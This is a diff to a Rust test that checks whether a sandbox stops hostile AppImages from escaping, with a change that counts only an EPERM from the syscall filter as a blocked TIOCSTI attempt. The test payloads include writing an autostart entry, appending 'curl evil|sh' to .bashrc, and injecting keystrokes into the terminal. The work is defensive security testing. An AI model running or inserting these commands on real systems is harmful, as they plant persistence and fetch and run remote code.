@@ -204,9 +204,12 @@ fn every_hostile_appimage_fails_to_escape() {
         evil("WriteAutostart", format!("echo x > {h}/.config/autostart/evil.desktop 2>/dev/null; echo RESULT=tried")),
         evil("WriteBashrc", format!("echo 'curl evil|sh' >> {h}/.bashrc 2>/dev/null; echo RESULT=tried")),
         evil("WriteHostTmp", format!("echo x > /tmp/sam-evil-{token} 2>/dev/null; echo RESULT=tried")),
+        // Only the syscall filter's EPERM counts as blocked: any other error
+        // (ENOTTY when the app has no terminal, EIO) would pass without the
+        // filter too, so it proves nothing.
         evil(
             "TypeIntoTerminal",
-            "python3 -c 'import fcntl,termios,sys\ntry:\n fcntl.ioctl(0, termios.TIOCSTI, b\"x\"); print(\"RESULT=escaped\")\nexcept OSError as e:\n print(\"RESULT=blocked:\" + str(e.errno))'",
+            "python3 -c 'import errno,fcntl,termios,sys\ntry:\n fcntl.ioctl(0, termios.TIOCSTI, b\"x\"); print(\"RESULT=escaped\")\nexcept OSError as e:\n print(\"RESULT=blocked\" if e.errno == errno.EPERM else \"RESULT=escaped: not refused by the filter, \" + errno.errorcode.get(e.errno, str(e.errno)))'",
         ),
         evil(
             "NetworkWhenOff",
